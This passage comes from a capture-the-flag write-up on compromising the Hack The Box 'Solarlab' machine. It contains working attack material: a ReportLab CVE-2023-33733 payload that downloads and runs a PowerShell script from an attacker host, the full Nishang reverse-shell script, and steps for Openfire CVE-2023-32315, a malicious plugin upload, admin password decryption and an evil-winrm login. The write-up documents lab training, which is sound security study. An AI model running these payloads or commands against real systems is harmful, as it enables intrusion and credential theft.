+<p>It seems like it executes <code>touch /tmp/exploited</code> but I don’t want to do that, I want to gain access to the system, so I will change it to receive a powershell reverse shell as its a windows machine by interpreting a shell.ps1 hosted in a mine-created http server. I will base64-encode the utf-16 encoded command to avoid special characters problems:</p>
+
+<pre><code class="language-bash">❯ echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.15.95/shell.ps1")' | iconv -t utf16le | base64 -w 0;echo
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADkANQAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==
+</code></pre>
+
+<p>And the html results like this:</p>
+
+<pre><code class="language-html">&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADkANQAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;
+                exploit
+&lt;/font&gt;&lt;/para&gt;
+</code></pre>
+
+<p>My shell.ps1 will be a copy of <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowershellTcp.ps1</a> but with the invocation of the function at the end resulting like this:</p>
+
+<pre><code class="language-powershell">function Invoke-PowerShellTcp 
+{ 
+&lt;#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+
+.DESCRIPTION
+This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
+Also, a standard netcat can connect to this script Bind to a specific port.
+
+The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy
+
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+
+.EXAMPLE
+PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
+the given IP and port. 
+
+.EXAMPLE
+PS &gt; Invoke-PowerShellTcp -Bind -Port 4444
+
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
+
+.EXAMPLE
+PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
+listening on the given IP and port. 
+
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+https://github.com/samratashok/nishang
+#&gt;      
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.95 -Port 443
+</code></pre>
+
+<p>Now I will start the http server to share this file:</p>
+
+<pre><code class="language-bash">❯ ls
+shell.ps1
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>And a nc listener to receive the shell:</p>
+
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p>In conclusion, the attack chain will be:</p>
+
+<pre><code class="language-plaintext">report page uses ReportLab pdf library -&gt; exploit CVE-2023-33733 -&gt; execute command to interpret the powershell script from attacker's http server -&gt; reverse shell on port 443 of attacker
+</code></pre>
+
+<p>The only thing left is to insert the html in the justification field to trigger the vulnerability. However, it says “character limit exceeded”:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921114440.png" alt="" /></p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921114503.png" alt="" /></p>
+
+<p>But then I remembered that other fields were reflected in the pdf so what if some field doesn’t have this check? I tried on the time_interval field and I finally receive the shell as blake:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921114715.png" alt="" /></p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921114745.png" alt="" /></p>
+
+<p>And the user.txt flag is available in blake’s Desktop:</p>
+
+<pre><code class="language-powershell">PS C:\Users\blake\Desktop&gt; type user.txt
+b5****************************d9
+</code></pre>
+    
+      <h1 id="access-as-administrator">
+        
+        
+          Access as administrator <a href="#access-as-administrator" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Looking for listening ports, I can see some ports that are related to <a href="https://xmpp.org/">xmpp server</a> which is a software for messaging:</p>
+
+<pre><code class="language-powershell">PS C:\Users\blake&gt; netstat -ano | findstr LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5724
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6016
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:6791           0.0.0.0:0              LISTENING       5724
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       688
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1072
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1672
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
+  TCP    10.10.11.16:139        0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:5000         0.0.0.0:0              LISTENING       2348
+  TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5223         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5262         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5263         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5269         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5270         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3160
+  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3160
+  TCP    [::]:135               [::]:0                 LISTENING       912
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       688
+  TCP    [::]:49665             [::]:0                 LISTENING       536
+  TCP    [::]:49666             [::]:0                 LISTENING       1072
+  TCP    [::]:49667             [::]:0                 LISTENING       1672
+  TCP    [::]:49668             [::]:0                 LISTENING       668
+</code></pre>
+
+<p>I will download chisel and forward all the ports that are not related to xmpp and aren’t visible externally (5040, 5000, 7070, 7443, 9090, 9091, 5985). If I don’t find nothing interesting, I will look for xmpp ports:</p>
+
+<pre><code class="language-bash">❯ ./chisel_linux server -p 1234 --reverse
+2024/09/21 12:22:33 server: Reverse tunnelling enabled
+2024/09/21 12:22:33 server: Fingerprint 2XjrlLyYw7dYEkmD4vDUm9qGPQLDk4kI0vlY/LjSvxU=
+2024/09/21 12:22:33 server: Listening on http://0.0.0.0:1234
+</code></pre>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; curl.exe http://10.10.15.95/chisel_windows.exe -o chisel.exe
+PS C:\Windows\Temp\privesc&gt; .\chisel.exe client 10.10.15.95:1234 R:5040:127.0.0.1:5040 R:5000:127.0.0.1:5000 R:7070:127.0.0.1:7070 R:7443:127.0.0.1:7443 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 R:5985:127.0.0.1:5985
+</code></pre>
+
+<blockquote>
+  <p>Note: To make the command more easy I executed <code>for port in "5040" "5000" "7070" "7443" "9090" "9091" "5985"; do echo -n "R:$port:127.0.0.1:$port ";done;echo</code> to have the part of the command that forward the ports.</p>
+</blockquote>
+
+<p>The port 9090 consists on a openfire administration console version 4.7.4:
+<img src="/assets/images/Solarlab/Pasted%20image%2020240921122947.png" alt="" /></p>
+
+<p>Searching for vulnerabilities, I saw <a href="https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce">this one</a> that consists on a lfi that I can use to create an admin user and have rce via plugin upload. I will reproduce the vulnerability.</p>
+
+<p>First, I need to have the csrf token and cookie:
+<img src="/assets/images/Solarlab/Pasted%20image%2020240921123708.png" alt="" /></p>
+
+<p>Then, with those cookies, I can create an admin user using <code>user-create.jsp</code>:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124154.png" alt="" /></p>
+
+<p>Now, I can login with username test and password <code>admin</code>:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124223.png" alt="" /></p>
+
+<p>With access to the dashboard, I can upload a plugin. The plugin that offers the poc is <a href="https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar">here</a>, which I will download it to my machine and then in “Plugins”, I will upload it:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124454.png" alt="" /></p>
+
+<p>Going to Server Settings &gt; Management Tool, asks for a password, which as said in the PoC, is 123:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124605.png" alt="" /></p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124612.png" alt="" /></p>
+
+<p>I will enter it and I have access to the malicious plugin:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124630.png" alt="" /></p>
+
+<p>Selecting “system command”, I’m able to execute a command. Executing <code>whoami</code>, I can see that I’m the user openfire:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124724.png" alt="" /></p>
+
+<p>I will gain access the same as before with the powershell encoded command:</p>
+
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124822.png" alt="" /></p>
+
+<p>And now I have access as openfire:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921124842.png" alt="" /></p>
+    
+      <h1 id="access-as-administrator-1">
+        
+        
+          Access as administrator <a href="#access-as-administrator-1" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Taking in advantage that I have access as openfire, I can look at the openfire script to initialize the database and some encryption for the Administrator password is there:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Openfire\embedded-db&gt; type openfire.script | findstr INSERT | findstr OFUSER
+INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
+INSERT INTO OFUSERPROP VALUES('admin','console.rows_per_page','/session-summary.jsp=25')
+</code></pre>
+
+<p>Searching in google on how to decrypt it, I stumble upon <a href="https://github.com/jas502n/OpenFire_Decrypt/">this</a> github that gives the code to decrypt the password. I will clone it and execute it:</p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/jas502n/OpenFire_Decrypt
+Cloning into 'OpenFire_Decrypt'...
+remote: Enumerating objects: 69, done.
+remote: Counting objects: 100% (69/69), done.
+remote: Compressing objects: 100% (63/63), done.
+remote: Total 69 (delta 21), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (69/69), 1.19 MiB | 3.33 MiB/s, done.
+Resolving deltas: 100% (21/21), done.
+❯ cd OpenFire_Decrypt
+</code></pre>
+
+<p>To decrypt it I have to follow the steps described in the poc:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921144054.png" alt="" /></p>
+
+<p>Then, I followed the steps from <a href="https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu">here</a> to install mvn and now I can run the tool:</p>
+
+<pre><code class="language-bash">PS C:\Program Files\Openfire\embedded-db&gt; type openfire.script | findstr INSERT | findstr OFUSER
+INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
+INSERT INTO OFUSERPROP VALUES('admin','console.rows_per_page','/session-summary.jsp=25')
+PS C:\Program Files\Openfire\embedded-db&gt; type openfire.script | findstr OFPROPERTY | findstr passwordKey
+INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
+PS C:\Program Files\Openfire\embedded-db&gt; 
+</code></pre>
+
+<pre><code class="language-bash">❯ cd OpenFire_Decrypt
+❯ mvn clean package -DskipTests
+❯ java -jar target/OpenFire-1.0-SNAPSHOT-jar-with-dependencies.jar
+__________________________________________
+OpenFire 管理后台账号密码解密
+encryptedPassword =&gt;&gt; 后台用户的密码
+passwordKey =&gt;&gt; 安装生成的秘钥
+
+[+] encryptedPassword= becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442
+[+] passwordKey= hGXiFzsKaAeYLjn
+[+] Password =&gt;&gt; ThisPasswordShouldDo!@
+</code></pre>
+
+<p>The password is ‘ThisPasswordShouldDo!@’. Let’s see if it works for administrator in the system using winrm port I forwarded before with chisel:</p>
+
+<pre><code class="language-bash">❯ netexec winrm localhost -u Administrator -p 'ThisPasswordShouldDo!@'
+WINRM       127.0.0.1       5985   SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 (name:SOLARLAB) (domain:solarlab)
+WINRM       127.0.0.1       5985   SOLARLAB         [+] solarlab\Administrator:ThisPasswordShouldDo!@ (Pwn3d!)
+</code></pre>
+
+<p>It works! Now I can gain access as administrator using evil-winrm:</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i localhost -u Administrator -p 'ThisPasswordShouldDo!@'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; 
+</code></pre>
+
+<p>And root.txt flag is available in Administrator’s Desktop:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+8f****************************ac
+</code></pre>
+
+<p>That’s the machine. Hope you liked it!</p>
+
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>21 September 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=smb" class="tag" style="font-family: 'Cascadia Code';">smb</a>
+    
+    <a href="/search?q=spreadsheet" class="tag" style="font-family: 'Cascadia Code';">spreadsheet</a>
+    
+    <a href="/search?q=libreoffice" class="tag" style="font-family: 'Cascadia Code';">libreoffice</a>
+    
+    <a href="/search?q=bruteforcing-web" class="tag" style="font-family: 'Cascadia Code';">bruteforcing-web</a>
+    
+    <a href="/search?q=rce" class="tag" style="font-family: 'Cascadia Code';">rce</a>
+    
+    <a href="/search?q=CVE-2023-33733" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-33733</a>
+    
+    <a href="/search?q=pdf" class="tag" style="font-family: 'Cascadia Code';">pdf</a>
+    
+    <a href="/search?q=openfire-exploit" class="tag" style="font-family: 'Cascadia Code';">openfire-exploit</a>
+    
+    <a href="/search?q=CVE-2023-32315" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-32315</a>
+    
+    <a href="/search?q=openfire-database" class="tag" style="font-family: 'Cascadia Code';">openfire-database</a>
+    
+    <a href="/search?q=decrypt-password" class="tag" style="font-family: 'Cascadia Code';">decrypt-password</a>
+    
+    <a href="/search?q=java" class="tag" style="font-family: 'Cascadia Code';">java</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Solarlab.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Solarlab.html&text=Writeup+for+HTB Solarlab writeup+from+HTB+held+on+21 September 2024&hashtags=ctf,writeup,Solarlab,HTB,smb,spreadsheet,libreoffice,bruteforcing-web,rce,CVE-2023-33733,pdf,openfire-exploit,CVE-2023-32315,openfire-database,decrypt-password,java','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Solarlab.html&text=Writeup+for+HTB Solarlab writeup+from+HTB+held+on+2024-09-21 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
